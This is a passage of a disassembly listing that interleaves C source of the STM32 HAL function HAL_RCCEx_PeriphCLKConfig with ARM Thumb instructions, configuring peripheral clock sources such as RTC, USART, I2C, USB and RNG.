      __HAL_RCC_PLLCLKOUT_ENABLE(RCC_PLL_SAI3CLK);
#else
      __HAL_RCC_PLLCLKOUT_ENABLE(RCC_PLL_SAI2CLK);
 8004536:	4b5d      	ldr	r3, [pc, #372]	; (80046ac <HAL_RCCEx_PeriphCLKConfig+0x1ac>)
 8004538:	68db      	ldr	r3, [r3, #12]
 800453a:	4a5c      	ldr	r2, [pc, #368]	; (80046ac <HAL_RCCEx_PeriphCLKConfig+0x1ac>)
 800453c:	f443 3380 	orr.w	r3, r3, #65536	; 0x10000
 8004540:	60d3      	str	r3, [r2, #12]
#endif /* RCC_PLLSAI2_SUPPORT */
      /* SAI1 clock source config set later after clock selection check */
      break;
 8004542:	e00c      	b.n	800455e <HAL_RCCEx_PeriphCLKConfig+0x5e>

    case RCC_SAI1CLKSOURCE_PLLSAI1:  /* PLLSAI1 is used as clock source for SAI1*/
      /* PLLSAI1 input clock, parameters M, N & P configuration and clock output (PLLSAI1ClockOut) */
      ret = RCCEx_PLLSAI1_Config(&(PeriphClkInit->PLLSAI1), DIVIDER_P_UPDATE);
 8004544:	687b      	ldr	r3, [r7, #4]
 8004546:	3304      	adds	r3, #4
 8004548:	2100      	movs	r1, #0
 800454a:	4618      	mov	r0, r3
 800454c:	f000 f9de 	bl	800490c <RCCEx_PLLSAI1_Config>
 8004550:	4603      	mov	r3, r0
 8004552:	74fb      	strb	r3, [r7, #19]
      /* SAI1 clock source config set later after clock selection check */
      break;
 8004554:	e003      	b.n	800455e <HAL_RCCEx_PeriphCLKConfig+0x5e>
#endif /* STM32L4P5xx || STM32L4Q5xx || STM32L4R5xx || STM32L4R7xx || STM32L4R9xx || STM32L4S5xx || STM32L4S7xx || STM32L4S9xx */
      /* SAI1 clock source config set later after clock selection check */
      break;

    default:
      ret = HAL_ERROR;
 8004556:	2301      	movs	r3, #1
 8004558:	74fb      	strb	r3, [r7, #19]
      break;
 800455a:	e000      	b.n	800455e <HAL_RCCEx_PeriphCLKConfig+0x5e>
      break;
 800455c:	bf00      	nop
    }

    if(ret == HAL_OK)
 800455e:	7cfb      	ldrb	r3, [r7, #19]
 8004560:	2b00      	cmp	r3, #0
 8004562:	d10b      	bne.n	800457c <HAL_RCCEx_PeriphCLKConfig+0x7c>
    {
      /* Set the source of SAI1 clock*/
      __HAL_RCC_SAI1_CONFIG(PeriphClkInit->Sai1ClockSelection);
 8004564:	4b51      	ldr	r3, [pc, #324]	; (80046ac <HAL_RCCEx_PeriphCLKConfig+0x1ac>)
 8004566:	f8d3 3088 	ldr.w	r3, [r3, #136]	; 0x88
 800456a:	f423 0240 	bic.w	r2, r3, #12582912	; 0xc00000
 800456e:	687b      	ldr	r3, [r7, #4]
 8004570:	6bdb      	ldr	r3, [r3, #60]	; 0x3c
 8004572:	494e      	ldr	r1, [pc, #312]	; (80046ac <HAL_RCCEx_PeriphCLKConfig+0x1ac>)
 8004574:	4313      	orrs	r3, r2
 8004576:	f8c1 3088 	str.w	r3, [r1, #136]	; 0x88
 800457a:	e001      	b.n	8004580 <HAL_RCCEx_PeriphCLKConfig+0x80>
    }
    else
    {
      /* set overall return value */
      status = ret;
 800457c:	7cfb      	ldrb	r3, [r7, #19]
 800457e:	74bb      	strb	r3, [r7, #18]
    }
  }
#endif /* SAI2 */

  /*-------------------------- RTC clock source configuration ----------------------*/
  if((PeriphClkInit->PeriphClockSelection & RCC_PERIPHCLK_RTC) == RCC_PERIPHCLK_RTC)
 8004580:	687b      	ldr	r3, [r7, #4]
 8004582:	681b      	ldr	r3, [r3, #0]
 8004584:	f403 3300 	and.w	r3, r3, #131072	; 0x20000
 8004588:	2b00      	cmp	r3, #0
 800458a:	f000 809e 	beq.w	80046ca <HAL_RCCEx_PeriphCLKConfig+0x1ca>
  {
    FlagStatus       pwrclkchanged = RESET;
 800458e:	2300      	movs	r3, #0
 8004590:	747b      	strb	r3, [r7, #17]

    /* Check for RTC Parameters used to output RTCCLK */
    assert_param(IS_RCC_RTCCLKSOURCE(PeriphClkInit->RTCClockSelection));

    /* Enable Power Clock */
    if(__HAL_RCC_PWR_IS_CLK_DISABLED() != 0U)
 8004592:	4b46      	ldr	r3, [pc, #280]	; (80046ac <HAL_RCCEx_PeriphCLKConfig+0x1ac>)
 8004594:	6d9b      	ldr	r3, [r3, #88]	; 0x58
 8004596:	f003 5380 	and.w	r3, r3, #268435456	; 0x10000000
 800459a:	2b00      	cmp	r3, #0
 800459c:	d101      	bne.n	80045a2 <HAL_RCCEx_PeriphCLKConfig+0xa2>
 800459e:	2301      	movs	r3, #1
 80045a0:	e000      	b.n	80045a4 <HAL_RCCEx_PeriphCLKConfig+0xa4>
 80045a2:	2300      	movs	r3, #0
 80045a4:	2b00      	cmp	r3, #0
 80045a6:	d00d      	beq.n	80045c4 <HAL_RCCEx_PeriphCLKConfig+0xc4>
    {
      __HAL_RCC_PWR_CLK_ENABLE();
 80045a8:	4b40      	ldr	r3, [pc, #256]	; (80046ac <HAL_RCCEx_PeriphCLKConfig+0x1ac>)
 80045aa:	6d9b      	ldr	r3, [r3, #88]	; 0x58
 80045ac:	4a3f      	ldr	r2, [pc, #252]	; (80046ac <HAL_RCCEx_PeriphCLKConfig+0x1ac>)
 80045ae:	f043 5380 	orr.w	r3, r3, #268435456	; 0x10000000
 80045b2:	6593      	str	r3, [r2, #88]	; 0x58
 80045b4:	4b3d      	ldr	r3, [pc, #244]	; (80046ac <HAL_RCCEx_PeriphCLKConfig+0x1ac>)
 80045b6:	6d9b      	ldr	r3, [r3, #88]	; 0x58
 80045b8:	f003 5380 	and.w	r3, r3, #268435456	; 0x10000000
 80045bc:	60bb      	str	r3, [r7, #8]
 80045be:	68bb      	ldr	r3, [r7, #8]
      pwrclkchanged = SET;
 80045c0:	2301      	movs	r3, #1
 80045c2:	747b      	strb	r3, [r7, #17]
    }

    /* Enable write access to Backup domain */
    SET_BIT(PWR->CR1, PWR_CR1_DBP);
 80045c4:	4b3a      	ldr	r3, [pc, #232]	; (80046b0 <HAL_RCCEx_PeriphCLKConfig+0x1b0>)
 80045c6:	681b      	ldr	r3, [r3, #0]
 80045c8:	4a39      	ldr	r2, [pc, #228]	; (80046b0 <HAL_RCCEx_PeriphCLKConfig+0x1b0>)
 80045ca:	f443 7380 	orr.w	r3, r3, #256	; 0x100
 80045ce:	6013      	str	r3, [r2, #0]

    /* Wait for Backup domain Write protection disable */
    tickstart = HAL_GetTick();
 80045d0:	f7fc fdda 	bl	8001188 <HAL_GetTick>
 80045d4:	60f8      	str	r0, [r7, #12]

    while(READ_BIT(PWR->CR1, PWR_CR1_DBP) == 0U)
 80045d6:	e009      	b.n	80045ec <HAL_RCCEx_PeriphCLKConfig+0xec>
    {
      if((HAL_GetTick() - tickstart) > RCC_DBP_TIMEOUT_VALUE)
 80045d8:	f7fc fdd6 	bl	8001188 <HAL_GetTick>
 80045dc:	4602      	mov	r2, r0
 80045de:	68fb      	ldr	r3, [r7, #12]
 80045e0:	1ad3      	subs	r3, r2, r3
 80045e2:	2b02      	cmp	r3, #2
 80045e4:	d902      	bls.n	80045ec <HAL_RCCEx_PeriphCLKConfig+0xec>
      {
        ret = HAL_TIMEOUT;
 80045e6:	2303      	movs	r3, #3
 80045e8:	74fb      	strb	r3, [r7, #19]
        break;
 80045ea:	e005      	b.n	80045f8 <HAL_RCCEx_PeriphCLKConfig+0xf8>
    while(READ_BIT(PWR->CR1, PWR_CR1_DBP) == 0U)
 80045ec:	4b30      	ldr	r3, [pc, #192]	; (80046b0 <HAL_RCCEx_PeriphCLKConfig+0x1b0>)
 80045ee:	681b      	ldr	r3, [r3, #0]
 80045f0:	f403 7380 	and.w	r3, r3, #256	; 0x100
 80045f4:	2b00      	cmp	r3, #0
 80045f6:	d0ef      	beq.n	80045d8 <HAL_RCCEx_PeriphCLKConfig+0xd8>
      }
    }

    if(ret == HAL_OK)
 80045f8:	7cfb      	ldrb	r3, [r7, #19]
 80045fa:	2b00      	cmp	r3, #0
 80045fc:	d15a      	bne.n	80046b4 <HAL_RCCEx_PeriphCLKConfig+0x1b4>
    {
      /* Reset the Backup domain only if the RTC Clock source selection is modified from default */
      tmpregister = READ_BIT(RCC->BDCR, RCC_BDCR_RTCSEL);
 80045fe:	4b2b      	ldr	r3, [pc, #172]	; (80046ac <HAL_RCCEx_PeriphCLKConfig+0x1ac>)
 8004600:	f8d3 3090 	ldr.w	r3, [r3, #144]	; 0x90
 8004604:	f403 7340 	and.w	r3, r3, #768	; 0x300
 8004608:	617b      	str	r3, [r7, #20]

      if((tmpregister != RCC_RTCCLKSOURCE_NONE) && (tmpregister != PeriphClkInit->RTCClockSelection))
 800460a:	697b      	ldr	r3, [r7, #20]
 800460c:	2b00      	cmp	r3, #0
 800460e:	d01e      	beq.n	800464e <HAL_RCCEx_PeriphCLKConfig+0x14e>
 8004610:	687b      	ldr	r3, [r7, #4]
 8004612:	6d1b      	ldr	r3, [r3, #80]	; 0x50
 8004614:	697a      	ldr	r2, [r7, #20]
 8004616:	429a      	cmp	r2, r3
 8004618:	d019      	beq.n	800464e <HAL_RCCEx_PeriphCLKConfig+0x14e>
      {
        /* Store the content of BDCR register before the reset of Backup Domain */
        tmpregister = READ_BIT(RCC->BDCR, ~(RCC_BDCR_RTCSEL));
 800461a:	4b24      	ldr	r3, [pc, #144]	; (80046ac <HAL_RCCEx_PeriphCLKConfig+0x1ac>)
 800461c:	f8d3 3090 	ldr.w	r3, [r3, #144]	; 0x90
 8004620:	f423 7340 	bic.w	r3, r3, #768	; 0x300
 8004624:	617b      	str	r3, [r7, #20]
        /* RTC Clock selection can be changed only if the Backup Domain is reset */
        __HAL_RCC_BACKUPRESET_FORCE();
 8004626:	4b21      	ldr	r3, [pc, #132]	; (80046ac <HAL_RCCEx_PeriphCLKConfig+0x1ac>)
 8004628:	f8d3 3090 	ldr.w	r3, [r3, #144]	; 0x90
 800462c:	4a1f      	ldr	r2, [pc, #124]	; (80046ac <HAL_RCCEx_PeriphCLKConfig+0x1ac>)
 800462e:	f443 3380 	orr.w	r3, r3, #65536	; 0x10000
 8004632:	f8c2 3090 	str.w	r3, [r2, #144]	; 0x90
        __HAL_RCC_BACKUPRESET_RELEASE();
 8004636:	4b1d      	ldr	r3, [pc, #116]	; (80046ac <HAL_RCCEx_PeriphCLKConfig+0x1ac>)
 8004638:	f8d3 3090 	ldr.w	r3, [r3, #144]	; 0x90
 800463c:	4a1b      	ldr	r2, [pc, #108]	; (80046ac <HAL_RCCEx_PeriphCLKConfig+0x1ac>)
 800463e:	f423 3380 	bic.w	r3, r3, #65536	; 0x10000
 8004642:	f8c2 3090 	str.w	r3, [r2, #144]	; 0x90
        /* Restore the Content of BDCR register */
        RCC->BDCR = tmpregister;
 8004646:	4a19      	ldr	r2, [pc, #100]	; (80046ac <HAL_RCCEx_PeriphCLKConfig+0x1ac>)
 8004648:	697b      	ldr	r3, [r7, #20]
 800464a:	f8c2 3090 	str.w	r3, [r2, #144]	; 0x90
      }

      /* Wait for LSE reactivation if LSE was enable prior to Backup Domain reset */
      if (HAL_IS_BIT_SET(tmpregister, RCC_BDCR_LSEON))
 800464e:	697b      	ldr	r3, [r7, #20]
 8004650:	f003 0301 	and.w	r3, r3, #1
 8004654:	2b00      	cmp	r3, #0
 8004656:	d016      	beq.n	8004686 <HAL_RCCEx_PeriphCLKConfig+0x186>
      {
        /* Get Start Tick*/
        tickstart = HAL_GetTick();
 8004658:	f7fc fd96 	bl	8001188 <HAL_GetTick>
 800465c:	60f8      	str	r0, [r7, #12]

        /* Wait till LSE is ready */
        while(READ_BIT(RCC->BDCR, RCC_BDCR_LSERDY) == 0U)
 800465e:	e00b      	b.n	8004678 <HAL_RCCEx_PeriphCLKConfig+0x178>
        {
          if((HAL_GetTick() - tickstart) > RCC_LSE_TIMEOUT_VALUE)
 8004660:	f7fc fd92 	bl	8001188 <HAL_GetTick>
 8004664:	4602      	mov	r2, r0
 8004666:	68fb      	ldr	r3, [r7, #12]
 8004668:	1ad3      	subs	r3, r2, r3
 800466a:	f241 3288 	movw	r2, #5000	; 0x1388
 800466e:	4293      	cmp	r3, r2
 8004670:	d902      	bls.n	8004678 <HAL_RCCEx_PeriphCLKConfig+0x178>
          {
            ret = HAL_TIMEOUT;
 8004672:	2303      	movs	r3, #3
 8004674:	74fb      	strb	r3, [r7, #19]
            break;
 8004676:	e006      	b.n	8004686 <HAL_RCCEx_PeriphCLKConfig+0x186>
        while(READ_BIT(RCC->BDCR, RCC_BDCR_LSERDY) == 0U)
 8004678:	4b0c      	ldr	r3, [pc, #48]	; (80046ac <HAL_RCCEx_PeriphCLKConfig+0x1ac>)
 800467a:	f8d3 3090 	ldr.w	r3, [r3, #144]	; 0x90
 800467e:	f003 0302 	and.w	r3, r3, #2
 8004682:	2b00      	cmp	r3, #0
 8004684:	d0ec      	beq.n	8004660 <HAL_RCCEx_PeriphCLKConfig+0x160>
          }
        }
      }

      if(ret == HAL_OK)
 8004686:	7cfb      	ldrb	r3, [r7, #19]
 8004688:	2b00      	cmp	r3, #0
 800468a:	d10b      	bne.n	80046a4 <HAL_RCCEx_PeriphCLKConfig+0x1a4>
      {
        /* Apply new RTC clock source selection */
        __HAL_RCC_RTC_CONFIG(PeriphClkInit->RTCClockSelection);
 800468c:	4b07      	ldr	r3, [pc, #28]	; (80046ac <HAL_RCCEx_PeriphCLKConfig+0x1ac>)
 800468e:	f8d3 3090 	ldr.w	r3, [r3, #144]	; 0x90
 8004692:	f423 7240 	bic.w	r2, r3, #768	; 0x300
 8004696:	687b      	ldr	r3, [r7, #4]
 8004698:	6d1b      	ldr	r3, [r3, #80]	; 0x50
 800469a:	4904      	ldr	r1, [pc, #16]	; (80046ac <HAL_RCCEx_PeriphCLKConfig+0x1ac>)
 800469c:	4313      	orrs	r3, r2
 800469e:	f8c1 3090 	str.w	r3, [r1, #144]	; 0x90
 80046a2:	e009      	b.n	80046b8 <HAL_RCCEx_PeriphCLKConfig+0x1b8>
      }
      else
      {
        /* set overall return value */
        status = ret;
 80046a4:	7cfb      	ldrb	r3, [r7, #19]
 80046a6:	74bb      	strb	r3, [r7, #18]
 80046a8:	e006      	b.n	80046b8 <HAL_RCCEx_PeriphCLKConfig+0x1b8>
 80046aa:	bf00      	nop
 80046ac:	40021000 	.word	0x40021000
 80046b0:	40007000 	.word	0x40007000
      }
    }
    else
    {
      /* set overall return value */
      status = ret;
 80046b4:	7cfb      	ldrb	r3, [r7, #19]
 80046b6:	74bb      	strb	r3, [r7, #18]
    }

    /* Restore clock configuration if changed */
    if(pwrclkchanged == SET)
 80046b8:	7c7b      	ldrb	r3, [r7, #17]
 80046ba:	2b01      	cmp	r3, #1
 80046bc:	d105      	bne.n	80046ca <HAL_RCCEx_PeriphCLKConfig+0x1ca>
    {
      __HAL_RCC_PWR_CLK_DISABLE();
 80046be:	4b8a      	ldr	r3, [pc, #552]	; (80048e8 <HAL_RCCEx_PeriphCLKConfig+0x3e8>)
 80046c0:	6d9b      	ldr	r3, [r3, #88]	; 0x58
 80046c2:	4a89      	ldr	r2, [pc, #548]	; (80048e8 <HAL_RCCEx_PeriphCLKConfig+0x3e8>)
 80046c4:	f023 5380 	bic.w	r3, r3, #268435456	; 0x10000000
 80046c8:	6593      	str	r3, [r2, #88]	; 0x58
    }
  }

  /*-------------------------- USART1 clock source configuration -------------------*/
  if(((PeriphClkInit->PeriphClockSelection) & RCC_PERIPHCLK_USART1) == RCC_PERIPHCLK_USART1)
 80046ca:	687b      	ldr	r3, [r7, #4]
 80046cc:	681b      	ldr	r3, [r3, #0]
 80046ce:	f003 0301 	and.w	r3, r3, #1
 80046d2:	2b00      	cmp	r3, #0
 80046d4:	d00a      	beq.n	80046ec <HAL_RCCEx_PeriphCLKConfig+0x1ec>
  {
    /* Check the parameters */
    assert_param(IS_RCC_USART1CLKSOURCE(PeriphClkInit->Usart1ClockSelection));

    /* Configure the USART1 clock source */
    __HAL_RCC_USART1_CONFIG(PeriphClkInit->Usart1ClockSelection);
 80046d6:	4b84      	ldr	r3, [pc, #528]	; (80048e8 <HAL_RCCEx_PeriphCLKConfig+0x3e8>)
 80046d8:	f8d3 3088 	ldr.w	r3, [r3, #136]	; 0x88
 80046dc:	f023 0203 	bic.w	r2, r3, #3
 80046e0:	687b      	ldr	r3, [r7, #4]
 80046e2:	6a1b      	ldr	r3, [r3, #32]
 80046e4:	4980      	ldr	r1, [pc, #512]	; (80048e8 <HAL_RCCEx_PeriphCLKConfig+0x3e8>)
 80046e6:	4313      	orrs	r3, r2
 80046e8:	f8c1 3088 	str.w	r3, [r1, #136]	; 0x88
  }

  /*-------------------------- USART2 clock source configuration -------------------*/
  if(((PeriphClkInit->PeriphClockSelection) & RCC_PERIPHCLK_USART2) == RCC_PERIPHCLK_USART2)
 80046ec:	687b      	ldr	r3, [r7, #4]
 80046ee:	681b      	ldr	r3, [r3, #0]
 80046f0:	f003 0302 	and.w	r3, r3, #2
 80046f4:	2b00      	cmp	r3, #0
 80046f6:	d00a      	beq.n	800470e <HAL_RCCEx_PeriphCLKConfig+0x20e>
  {
    /* Check the parameters */
    assert_param(IS_RCC_USART2CLKSOURCE(PeriphClkInit->Usart2ClockSelection));

    /* Configure the USART2 clock source */
    __HAL_RCC_USART2_CONFIG(PeriphClkInit->Usart2ClockSelection);
 80046f8:	4b7b      	ldr	r3, [pc, #492]	; (80048e8 <HAL_RCCEx_PeriphCLKConfig+0x3e8>)
 80046fa:	f8d3 3088 	ldr.w	r3, [r3, #136]	; 0x88
 80046fe:	f023 020c 	bic.w	r2, r3, #12
 8004702:	687b      	ldr	r3, [r7, #4]
 8004704:	6a5b      	ldr	r3, [r3, #36]	; 0x24
 8004706:	4978      	ldr	r1, [pc, #480]	; (80048e8 <HAL_RCCEx_PeriphCLKConfig+0x3e8>)
 8004708:	4313      	orrs	r3, r2
 800470a:	f8c1 3088 	str.w	r3, [r1, #136]	; 0x88
  }

#endif /* UART5 */

  /*-------------------------- LPUART1 clock source configuration ------------------*/
  if(((PeriphClkInit->PeriphClockSelection) & RCC_PERIPHCLK_LPUART1) == RCC_PERIPHCLK_LPUART1)
 800470e:	687b      	ldr	r3, [r7, #4]
 8004710:	681b      	ldr	r3, [r3, #0]
 8004712:	f003 0320 	and.w	r3, r3, #32
 8004716:	2b00      	cmp	r3, #0
 8004718:	d00a      	beq.n	8004730 <HAL_RCCEx_PeriphCLKConfig+0x230>
  {
    /* Check the parameters */
    assert_param(IS_RCC_LPUART1CLKSOURCE(PeriphClkInit->Lpuart1ClockSelection));

    /* Configure the LPUART1 clock source */
    __HAL_RCC_LPUART1_CONFIG(PeriphClkInit->Lpuart1ClockSelection);
 800471a:	4b73      	ldr	r3, [pc, #460]	; (80048e8 <HAL_RCCEx_PeriphCLKConfig+0x3e8>)
 800471c:	f8d3 3088 	ldr.w	r3, [r3, #136]	; 0x88
 8004720:	f423 6240 	bic.w	r2, r3, #3072	; 0xc00
 8004724:	687b      	ldr	r3, [r7, #4]
 8004726:	6a9b      	ldr	r3, [r3, #40]	; 0x28
 8004728:	496f      	ldr	r1, [pc, #444]	; (80048e8 <HAL_RCCEx_PeriphCLKConfig+0x3e8>)
 800472a:	4313      	orrs	r3, r2
 800472c:	f8c1 3088 	str.w	r3, [r1, #136]	; 0x88
  }

  /*-------------------------- LPTIM1 clock source configuration -------------------*/
  if(((PeriphClkInit->PeriphClockSelection) & RCC_PERIPHCLK_LPTIM1) == (RCC_PERIPHCLK_LPTIM1))
 8004730:	687b      	ldr	r3, [r7, #4]
 8004732:	681b      	ldr	r3, [r3, #0]
 8004734:	f403 7300 	and.w	r3, r3, #512	; 0x200
 8004738:	2b00      	cmp	r3, #0
 800473a:	d00a      	beq.n	8004752 <HAL_RCCEx_PeriphCLKConfig+0x252>
  {
    assert_param(IS_RCC_LPTIM1CLK(PeriphClkInit->Lptim1ClockSelection));
    __HAL_RCC_LPTIM1_CONFIG(PeriphClkInit->Lptim1ClockSelection);
 800473c:	4b6a      	ldr	r3, [pc, #424]	; (80048e8 <HAL_RCCEx_PeriphCLKConfig+0x3e8>)
 800473e:	f8d3 3088 	ldr.w	r3, [r3, #136]	; 0x88
 8004742:	f423 2240 	bic.w	r2, r3, #786432	; 0xc0000
 8004746:	687b      	ldr	r3, [r7, #4]
 8004748:	6b5b      	ldr	r3, [r3, #52]	; 0x34
 800474a:	4967      	ldr	r1, [pc, #412]	; (80048e8 <HAL_RCCEx_PeriphCLKConfig+0x3e8>)
 800474c:	4313      	orrs	r3, r2
 800474e:	f8c1 3088 	str.w	r3, [r1, #136]	; 0x88
  }

  /*-------------------------- LPTIM2 clock source configuration -------------------*/
  if(((PeriphClkInit->PeriphClockSelection) & RCC_PERIPHCLK_LPTIM2) == (RCC_PERIPHCLK_LPTIM2))
 8004752:	687b      	ldr	r3, [r7, #4]
 8004754:	681b      	ldr	r3, [r3, #0]
 8004756:	f403 6380 	and.w	r3, r3, #1024	; 0x400
 800475a:	2b00      	cmp	r3, #0
 800475c:	d00a      	beq.n	8004774 <HAL_RCCEx_PeriphCLKConfig+0x274>
  {
    assert_param(IS_RCC_LPTIM2CLK(PeriphClkInit->Lptim2ClockSelection));
    __HAL_RCC_LPTIM2_CONFIG(PeriphClkInit->Lptim2ClockSelection);
 800475e:	4b62      	ldr	r3, [pc, #392]	; (80048e8 <HAL_RCCEx_PeriphCLKConfig+0x3e8>)
 8004760:	f8d3 3088 	ldr.w	r3, [r3, #136]	; 0x88
 8004764:	f423 1240 	bic.w	r2, r3, #3145728	; 0x300000
 8004768:	687b      	ldr	r3, [r7, #4]
 800476a:	6b9b      	ldr	r3, [r3, #56]	; 0x38
 800476c:	495e      	ldr	r1, [pc, #376]	; (80048e8 <HAL_RCCEx_PeriphCLKConfig+0x3e8>)
 800476e:	4313      	orrs	r3, r2
 8004770:	f8c1 3088 	str.w	r3, [r1, #136]	; 0x88
  }

  /*-------------------------- I2C1 clock source configuration ---------------------*/
  if(((PeriphClkInit->PeriphClockSelection) & RCC_PERIPHCLK_I2C1) == RCC_PERIPHCLK_I2C1)
 8004774:	687b      	ldr	r3, [r7, #4]
 8004776:	681b      	ldr	r3, [r3, #0]
 8004778:	f003 0340 	and.w	r3, r3, #64	; 0x40
 800477c:	2b00      	cmp	r3, #0
 800477e:	d00a      	beq.n	8004796 <HAL_RCCEx_PeriphCLKConfig+0x296>
  {
    /* Check the parameters */
    assert_param(IS_RCC_I2C1CLKSOURCE(PeriphClkInit->I2c1ClockSelection));

    /* Configure the I2C1 clock source */
    __HAL_RCC_I2C1_CONFIG(PeriphClkInit->I2c1ClockSelection);
 8004780:	4b59      	ldr	r3, [pc, #356]	; (80048e8 <HAL_RCCEx_PeriphCLKConfig+0x3e8>)
 8004782:	f8d3 3088 	ldr.w	r3, [r3, #136]	; 0x88
 8004786:	f423 5240 	bic.w	r2, r3, #12288	; 0x3000
 800478a:	687b      	ldr	r3, [r7, #4]
 800478c:	6adb      	ldr	r3, [r3, #44]	; 0x2c
 800478e:	4956      	ldr	r1, [pc, #344]	; (80048e8 <HAL_RCCEx_PeriphCLKConfig+0x3e8>)
 8004790:	4313      	orrs	r3, r2
 8004792:	f8c1 3088 	str.w	r3, [r1, #136]	; 0x88
  }

#endif /* I2C2 */

  /*-------------------------- I2C3 clock source configuration ---------------------*/
  if(((PeriphClkInit->PeriphClockSelection) & RCC_PERIPHCLK_I2C3) == RCC_PERIPHCLK_I2C3)
 8004796:	687b      	ldr	r3, [r7, #4]
 8004798:	681b      	ldr	r3, [r3, #0]
 800479a:	f403 7380 	and.w	r3, r3, #256	; 0x100
 800479e:	2b00      	cmp	r3, #0
 80047a0:	d00a      	beq.n	80047b8 <HAL_RCCEx_PeriphCLKConfig+0x2b8>
  {
    /* Check the parameters */
    assert_param(IS_RCC_I2C3CLKSOURCE(PeriphClkInit->I2c3ClockSelection));

    /* Configure the I2C3 clock source */
    __HAL_RCC_I2C3_CONFIG(PeriphClkInit->I2c3ClockSelection);
 80047a2:	4b51      	ldr	r3, [pc, #324]	; (80048e8 <HAL_RCCEx_PeriphCLKConfig+0x3e8>)
 80047a4:	f8d3 3088 	ldr.w	r3, [r3, #136]	; 0x88
 80047a8:	f423 3240 	bic.w	r2, r3, #196608	; 0x30000
 80047ac:	687b      	ldr	r3, [r7, #4]
 80047ae:	6b1b      	ldr	r3, [r3, #48]	; 0x30
 80047b0:	494d      	ldr	r1, [pc, #308]	; (80048e8 <HAL_RCCEx_PeriphCLKConfig+0x3e8>)
 80047b2:	4313      	orrs	r3, r2
 80047b4:	f8c1 3088 	str.w	r3, [r1, #136]	; 0x88
#endif /* I2C4 */

#if defined(USB_OTG_FS) || defined(USB)

  /*-------------------------- USB clock source configuration ----------------------*/
  if(((PeriphClkInit->PeriphClockSelection) & RCC_PERIPHCLK_USB) == (RCC_PERIPHCLK_USB))
 80047b8:	687b      	ldr	r3, [r7, #4]
 80047ba:	681b      	ldr	r3, [r3, #0]
 80047bc:	f403 5300 	and.w	r3, r3, #8192	; 0x2000
 80047c0:	2b00      	cmp	r3, #0
 80047c2:	d028      	beq.n	8004816 <HAL_RCCEx_PeriphCLKConfig+0x316>
  {
    assert_param(IS_RCC_USBCLKSOURCE(PeriphClkInit->UsbClockSelection));
    __HAL_RCC_USB_CONFIG(PeriphClkInit->UsbClockSelection);
 80047c4:	4b48      	ldr	r3, [pc, #288]	; (80048e8 <HAL_RCCEx_PeriphCLKConfig+0x3e8>)
 80047c6:	f8d3 3088 	ldr.w	r3, [r3, #136]	; 0x88
 80047ca:	f023 6240 	bic.w	r2, r3, #201326592	; 0xc000000
 80047ce:	687b      	ldr	r3, [r7, #4]
 80047d0:	6c1b      	ldr	r3, [r3, #64]	; 0x40
 80047d2:	4945      	ldr	r1, [pc, #276]	; (80048e8 <HAL_RCCEx_PeriphCLKConfig+0x3e8>)
 80047d4:	4313      	orrs	r3, r2
 80047d6:	f8c1 3088 	str.w	r3, [r1, #136]	; 0x88

    if(PeriphClkInit->UsbClockSelection == RCC_USBCLKSOURCE_PLL)
 80047da:	687b      	ldr	r3, [r7, #4]
 80047dc:	6c1b      	ldr	r3, [r3, #64]	; 0x40
 80047de:	f1b3 6f00 	cmp.w	r3, #134217728	; 0x8000000
 80047e2:	d106      	bne.n	80047f2 <HAL_RCCEx_PeriphCLKConfig+0x2f2>
    {
      /* Enable PLL48M1CLK output clock */
      __HAL_RCC_PLLCLKOUT_ENABLE(RCC_PLL_48M1CLK);
 80047e4:	4b40      	ldr	r3, [pc, #256]	; (80048e8 <HAL_RCCEx_PeriphCLKConfig+0x3e8>)
 80047e6:	68db      	ldr	r3, [r3, #12]
 80047e8:	4a3f      	ldr	r2, [pc, #252]	; (80048e8 <HAL_RCCEx_PeriphCLKConfig+0x3e8>)
 80047ea:	f443 1380 	orr.w	r3, r3, #1048576	; 0x100000
 80047ee:	60d3      	str	r3, [r2, #12]
 80047f0:	e011      	b.n	8004816 <HAL_RCCEx_PeriphCLKConfig+0x316>
    }
    else
    {
#if defined(RCC_PLLSAI1_SUPPORT)
      if(PeriphClkInit->UsbClockSelection == RCC_USBCLKSOURCE_PLLSAI1)
 80047f2:	687b      	ldr	r3, [r7, #4]
 80047f4:	6c1b      	ldr	r3, [r3, #64]	; 0x40
 80047f6:	f1b3 6f80 	cmp.w	r3, #67108864	; 0x4000000
 80047fa:	d10c      	bne.n	8004816 <HAL_RCCEx_PeriphCLKConfig+0x316>
      {
        /* PLLSAI1 input clock, parameters M, N & Q configuration and clock output (PLLSAI1ClockOut) */
        ret = RCCEx_PLLSAI1_Config(&(PeriphClkInit->PLLSAI1), DIVIDER_Q_UPDATE);
 80047fc:	687b      	ldr	r3, [r7, #4]
 80047fe:	3304      	adds	r3, #4
 8004800:	2101      	movs	r1, #1
 8004802:	4618      	mov	r0, r3
 8004804:	f000 f882 	bl	800490c <RCCEx_PLLSAI1_Config>
 8004808:	4603      	mov	r3, r0
 800480a:	74fb      	strb	r3, [r7, #19]

        if(ret != HAL_OK)
 800480c:	7cfb      	ldrb	r3, [r7, #19]
 800480e:	2b00      	cmp	r3, #0
 8004810:	d001      	beq.n	8004816 <HAL_RCCEx_PeriphCLKConfig+0x316>
        {
          /* set overall return value */
          status = ret;
 8004812:	7cfb      	ldrb	r3, [r7, #19]
 8004814:	74bb      	strb	r3, [r7, #18]
  }

#endif /* SDMMC1 */

  /*-------------------------- RNG clock source configuration ----------------------*/
  if(((PeriphClkInit->PeriphClockSelection) & RCC_PERIPHCLK_RNG) == (RCC_PERIPHCLK_RNG))
 8004816:	687b      	ldr	r3, [r7, #4]
 8004818:	681b      	ldr	r3, [r3, #0]
 800481a:	f403 2380 	and.w	r3, r3, #262144	; 0x40000
 800481e:	2b00      	cmp	r3, #0
 8004820:	d028      	beq.n	8004874 <HAL_RCCEx_PeriphCLKConfig+0x374>
  {
    assert_param(IS_RCC_RNGCLKSOURCE(PeriphClkInit->RngClockSelection));
    __HAL_RCC_RNG_CONFIG(PeriphClkInit->RngClockSelection);
 8004822:	4b31      	ldr	r3, [pc, #196]	; (80048e8 <HAL_RCCEx_PeriphCLKConfig+0x3e8>)
 8004824:	f8d3 3088 	ldr.w	r3, [r3, #136]	; 0x88
 8004828:	f023 6240 	bic.w	r2, r3, #201326592	; 0xc000000
 800482c:	687b      	ldr	r3, [r7, #4]
 800482e:	6c5b      	ldr	r3, [r3, #68]	; 0x44
 8004830:	492d      	ldr	r1, [pc, #180]	; (80048e8 <HAL_RCCEx_PeriphCLKConfig+0x3e8>)
 8004832:	4313      	orrs	r3, r2
 8004834:	f8c1 3088 	str.w	r3, [r1, #136]	; 0x88

    if(PeriphClkInit->RngClockSelection == RCC_RNGCLKSOURCE_PLL)
